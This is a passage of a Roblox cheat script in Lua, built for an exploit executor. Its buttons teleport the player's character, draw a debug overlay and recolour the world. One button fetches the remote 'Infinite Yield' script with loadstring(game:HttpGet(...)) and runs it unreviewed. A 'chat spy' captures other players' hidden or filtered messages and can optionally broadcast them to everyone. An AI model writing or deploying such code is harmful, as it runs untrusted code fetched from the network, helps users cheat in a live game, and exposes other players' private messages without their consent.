	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(356.0196838378906, 21.834556579589844, 311.0973205566406)
end)

TeleportSection:NewButton("HQ Parade Ground Spot", "Teleports you to the HQ Parade Ground spot", function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(189.24520874023438, 57.72883605957031, 1030.4423828125)
end)


--SettingSection


SettingSection:NewButton("Debug Info", "Just shows info in top right", function()

local Players = game:GetService("Players")
local Text = Drawing.new("Text")
Text.Text = ""
Text.Color = Color3.new(1, 1, 1)
Text.OutlineColor = Color3.new(0, 0, 0)
Text.Center = true
Text.Outline = true
Text.Size = 20
Text.Font = Drawing.Fonts.Monospace
Text.Transparency = 0.9

local VelocityText = Drawing.new("Text")
VelocityText.Text = ""
VelocityText.Color = Color3.new(1, 1, 1)
VelocityText.OutlineColor = Color3.new(0, 0, 0)
VelocityText.Center = true
VelocityText.Outline = true
VelocityText.Size = 20
VelocityText.Font = Drawing.Fonts.Monospace
VelocityText.Transparency = 0.9

local WalkspeedText = Drawing.new("Text")
WalkspeedText.Text = ""
WalkspeedText.Color = Color3.new(1, 1, 1)
WalkspeedText.OutlineColor = Color3.new(0, 0, 0)
WalkspeedText.Center = true
WalkspeedText.Outline = true
WalkspeedText.Size = 20
WalkspeedText.Font = Drawing.Fonts.Monospace
WalkspeedText.Transparency = 0.9

local function UpdateHealth()
    local Player = Players.LocalPlayer
    if Player.Character then
        local Humanoid = Player.Character:FindFirstChildOfClass("Humanoid")
        if Humanoid then
            local Health = Humanoid.Health
            if Health < 35 then
                Text.Color = Color3.new(1, 0, 0) -- red
            elseif Health < 95 then
                Text.Color = Color3.new(1, 1, 0) -- yellow
            else
                Text.Color = Color3.new(1, 1, 1) -- white
            end
            Text.Text = "LocalPlayer Health: " .. tostring(Health)
            Text.Position = Vector2.new((workspace.CurrentCamera.ViewportSize.X - 180), 50)
            Text.Visible = true
        end
    end
end

local function UpdateVelocity()
    local Player = Players.LocalPlayer
    if Player.Character then
        local Humanoid = Player.Character:FindFirstChildOfClass("Humanoid")
        if Humanoid then
            local Velocity = Humanoid.RootPart.Velocity
            VelocityText.Text = "Velocity: (" .. tostring(math.floor(Velocity.X)) .. ", " .. tostring(math.floor(Velocity.Y)) .. ", " .. tostring(math.floor(Velocity.Z)) .. ")"
            VelocityText.Position = Vector2.new((workspace.CurrentCamera.ViewportSize.X - 200), 70)
            VelocityText.Visible = true
        end
    end
end

local function UpdateWalkspeed()
    local Player = Players.LocalPlayer
    local Walkspeed = Player.Character and Player.Character:FindFirstChild("Humanoid") and Player.Character.Humanoid.WalkSpeed
    if Walkspeed then
        WalkspeedText.Text = "Walkspeed: " .. tostring(Walkspeed)
        WalkspeedText.Position = Vector2.new((workspace.CurrentCamera.ViewportSize.X - 230), 90)
        WalkspeedText.Visible = true
    end
end

game:GetService("RunService").RenderStepped:Connect(function()
    UpdateHealth()
    UpdateVelocity()
    UpdateWalkspeed()
end)


local ObjectCounter = Drawing.new("Text")
ObjectCounter.Text = ""
ObjectCounter.Color = Color3.new(1, 1, 1)
ObjectCounter.OutlineColor = Color3.new(0, 0, 0)
ObjectCounter.Center = true
ObjectCounter.Outline = true
ObjectCounter.Size = 20
ObjectCounter.Font = Drawing.Fonts.Monospace
ObjectCounter.Transparency = 0.9
ObjectCounter.Position = Vector2.new((workspace.CurrentCamera.ViewportSize.X - 240), 110)
ObjectCounter.Visible = true

local function UpdateObjectCounter()
    local Objects = workspace:GetChildren()
    local ObjectCount = 0
    for i, Object in ipairs(Objects) do
        if Object:IsA("BasePart") then
            ObjectCount = ObjectCount + 1
        end
    end
    ObjectCounter.Text = "Objects: " .. tostring(ObjectCount)
end

game:GetService("RunService").Heartbeat:Connect(function()
    UpdateObjectCounter()
end)




local Players = game:GetService("Players")
local PlayerCount = #Players:GetPlayers()

local PlayerCountText = Drawing.new("Text")
PlayerCountText.Text = "Players: " .. tostring(PlayerCount)
PlayerCountText.Color = Color3.new(1, 1, 1)
PlayerCountText.OutlineColor = Color3.new(0, 0, 0)
PlayerCountText.Center = true
PlayerCountText.Outline = true
PlayerCountText.Size = 20
PlayerCountText.Font = Drawing.Fonts.Monospace
PlayerCountText.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X - 245, 130)
PlayerCountText.Transparency = 0.9

Players.PlayerAdded:Connect(function()
    PlayerCount = #Players:GetPlayers()
    PlayerCountText.Text = "Players: " .. tostring(PlayerCount)
end)

Players.PlayerRemoving:Connect(function()
    PlayerCount = #Players:GetPlayers()
    PlayerCountText.Text = "Players: " .. tostring(PlayerCount)
end)




local Players = game:GetService("Players")
local PlayerNameText = Drawing.new("Text")
PlayerNameText.Text = ""
PlayerNameText.Color = Color3.new(1, 1, 1)
PlayerNameText.OutlineColor = Color3.new(0, 0, 0)
PlayerNameText.Center = true
PlayerNameText.Outline = true
PlayerNameText.Size = 20
PlayerNameText.Font = Drawing.Fonts.Monospace
PlayerNameText.Transparency = 0.9

local function UpdatePlayerName()
    local Player = Players.LocalPlayer
    if Player then
        local name = Player.Name
        if name == "elVacco" or name == "EngineOwningOnRoblox" then
            name = "PilotsFailed"
        elseif name == "WeighedMouse293" then
            name = "Steo"
        elseif name == "SniffyModzYolo" then
            name = "Exam"
        end
        PlayerNameText.Text = "Hello! " .. name
        PlayerNameText.Position = Vector2.new((workspace.CurrentCamera.ViewportSize.X - 245), 5)
        PlayerNameText.Visible = true
    end
end

game:GetService("RunService").RenderStepped:Connect(function()
    UpdatePlayerName()
end)




local PlaceIDText = Drawing.new("Text")
PlaceIDText.Text = ""
PlaceIDText.Color = Color3.new(1, 1, 1)
PlaceIDText.OutlineColor = Color3.new(0, 0, 0)
PlaceIDText.Center = true
PlaceIDText.Outline = true
PlaceIDText.Size = 20
PlaceIDText.Font = Drawing.Fonts.Monospace
PlaceIDText.Transparency = 0.9
PlaceIDText.Position = Vector2.new((workspace.CurrentCamera.ViewportSize.X - 280), 20)

local placeId = game.PlaceId
if placeId > 0 then
    PlaceIDText.Text = "Place ID: " .. tostring(placeId)
    PlaceIDText.Visible = true
end


local GamepadText = Drawing.new("Text")
GamepadText.Text = ""
GamepadText.Color = Color3.new(1, 1, 1)
GamepadText.OutlineColor = Color3.new(0, 0, 0)
GamepadText.Center = true
GamepadText.Outline = true
GamepadText.Size = 20
GamepadText.Font = Drawing.Fonts.Monospace
GamepadText.Transparency = 0.9
GamepadText.Position = Vector2.new((workspace.CurrentCamera.ViewportSize.X - 220), 150)

local function UpdateGamepadStatus()
    local GamepadConnected = false
    for _, inputObject in pairs(game:GetService("UserInputService"):GetConnectedGamepads()) do
        GamepadConnected = true
    end
    if GamepadConnected then
        GamepadText.Text = "Gamepad Detected"
        GamepadText.Color = Color3.new(0, 1, 0) -- green
    else
        GamepadText.Text = "No Gamepad Detected"
        GamepadText.Color = Color3.new(1, 0, 0) -- red
    end
end

game:GetService("UserInputService").GamepadConnected:Connect(function(gamepad)
    UpdateGamepadStatus()
end)

game:GetService("UserInputService").GamepadDisconnected:Connect(function(gamepad)
    UpdateGamepadStatus()
end)

UpdateGamepadStatus()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ViewAngleText = Drawing.new("Text")
ViewAngleText.Text = ""
ViewAngleText.Color = Color3.new(1, 1, 1)
ViewAngleText.OutlineColor = Color3.new(0, 0, 0)
ViewAngleText.Center = true
ViewAngleText.Outline = true
ViewAngleText.Size = 20
ViewAngleText.Font = Drawing.Fonts.Monospace
ViewAngleText.Transparency = 0.9

local function UpdateViewAngle()
    local Player = Players.LocalPlayer
    if Player and Player.Character and Player.Character:FindFirstChild("Humanoid") then
        local Camera = workspace.CurrentCamera
        local Humanoid = Player.Character.Humanoid
        local LookVector = Camera.CFrame.LookVector
        local HumanoidLookVector = Humanoid.RootPart.CFrame.LookVector
        local Angle = math.acos(LookVector:Dot(HumanoidLookVector)) * (180 / math.pi)
        ViewAngleText.Text = "View Angle: " .. math.floor(Angle) .. "°"
        ViewAngleText.Position = Vector2.new((workspace.CurrentCamera.ViewportSize.X - 220), 170)
        ViewAngleText.Visible = true
    end
end

RunService.RenderStepped:Connect(function()
    UpdateViewAngle()
end)

Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local AirStuckText = Drawing.new("Text")
AirStuckText.Text = "SlowWalk Off"
AirStuckText.Color = Color3.fromRGB(255, 0, 0)
AirStuckText.OutlineColor = Color3.fromRGB(0, 0, 0)
AirStuckText.Center = true
AirStuckText.Outline = true
AirStuckText.Size = 20
AirStuckText.Font = Drawing.Fonts.Monospace
AirStuckText.Transparency = 0.9
AirStuckText.Position = Vector2.new((workspace.CurrentCamera.ViewportSize.X - 100), 20)

local function UpdateAirStuckText()
    if UserInputService:IsKeyDown(Enum.KeyCode.Minus) then
        Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
        AirStuckText.Text = "SlowWalk On"
        AirStuckText.Color = Color3.fromRGB(0, 255, 0)
    else
        AirStuckText.Text = "SlowWalk Off"
        AirStuckText.Color = Color3.fromRGB(255, 0, 0)
    end
end

game:GetService("RunService").RenderStepped:Connect(function()
    UpdateAirStuckText()
end)


local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local LookAngleText = Drawing.new("Text")
LookAngleText.Text = "Look Angle: 0"
LookAngleText.Color = Color3.fromRGB(255, 255, 255)
LookAngleText.OutlineColor = Color3.fromRGB(0, 0, 0)
LookAngleText.Center = true
LookAngleText.Outline = true
LookAngleText.Size = 20
LookAngleText.Font = Drawing.Fonts.Monospace
LookAngleText.Transparency = 0.9
LookAngleText.Position = Vector2.new((workspace.CurrentCamera.ViewportSize.X - 220), 185)

local function GetLookAngle()
    local character = Players.LocalPlayer.Character
    if not character then return end
    
    local cameraCFrame = workspace.CurrentCamera.CFrame
    local lookVector = character.Head.CFrame:VectorToWorldSpace(Vector3.new(0, 0, -1))
    local angle = math.floor(math.atan2(lookVector.X, lookVector.Z) / math.pi * 180)
    
    LookAngleText.Text = "Look Angle: " .. angle
end

game:GetService("RunService").RenderStepped:Connect(function()
    GetLookAngle()
end)

end)


SettingSection:NewKeybind("Toggle UI", "Close/Open UI", Enum.KeyCode.BackSlash, function()
	Library:ToggleUI()
end)


SettingSection:NewButton("Infinite Yield", "This another populuar universal script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
end)




SettingSection:NewButton("Unhide Chat", "This will allow you to see hidden chat", function()
--This script reveals ALL hidden messages in the default chat

enabled = true --chat "/spy" to toggle!
spyOnMyself = true --if true will check your messages too
public = false --if true will chat the logs publicly (fun, risky)
publicItalics = true --if true will use /me to stand out
privateProperties = { --customize private logs
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}


local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)=="/spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end

for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
end)



SettingSection:NewButton("Rainbow World(Rejoin to fix)", "Just makes everything rainbow", function()
if not game:IsLoaded() then
    game.Loaded:Wait()
end
wait()

--// instances
local cc = Instance.new("ColorCorrectionEffect")
local lighting = game:GetService("Lighting")
local sbox = Instance.new("Sky")

--// hd killer
local ihateu = {"DepthOfFieldEffect", "SunRaysEffect", "BloomEffect", "BlurEffect", "ColorCorrectionEffect", "Atmosphere"}
for i, v in pairs(lighting:GetChildren()) do
    for index, value in ipairs(ihateu) do
        if v:IsA(value) then
           v:Destroy() 
        end
    end
end

--// setup
cc.Parent = game.Lighting
cc.Saturation = -0.1
cc.Contrast = -0.1
lighting.GlobalShadows = false

sethiddenproperty(lighting, "Technology", Enum.Technology.Compatibility) 

sbox.Parent = lighting
sbox.SkyboxBk = "http://www.roblox.com/asset/?id=271042516"
sbox.SkyboxDn = "http://www.roblox.com/asset/?id=271077243"
sbox.SkyboxFt = "http://www.roblox.com/asset/?id=271042556"
sbox.SkyboxLf = "http://www.roblox.com/asset/?id=271042310"
sbox.SkyboxRt = "http://www.roblox.com/asset/?id=271042467"
sbox.SkyboxUp = "http://www.roblox.com/asset/?id=271077958"

lighting.Ambient = Color3.new(0,0,0)
lighting.FogColor = Color3.new(0,0,0)
lighting.ClockTime = 3
lighting.FogEnd = 2000

local hue = 0
while true do
    hue = hue + 1
    if hue > 360 then
        hue = 0
    end
    local color = Color3.fromHSV(hue/360, 1, 1)
    lighting.Ambient = color
    lighting.FogColor = color
    wait(0.05)
end
end)
